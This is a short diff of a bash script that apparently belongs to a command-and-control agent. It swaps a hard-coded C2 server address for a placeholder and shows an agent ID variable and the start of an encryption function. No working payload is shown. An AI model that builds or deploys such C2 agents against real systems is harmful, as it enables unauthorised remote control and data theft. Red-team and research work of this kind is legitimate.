@@ -10,7 +10,7 @@
 
 #!/bin/bash
 
-C2Server="http://10.0.2.4:8000"  # Replace with the IP address and port of your C2 server
+C2Server="http://Server_IP_Here:8000"  # Replace with the IP address and port of your C2 server
 AgentID=""
 
 encrypt_data() {
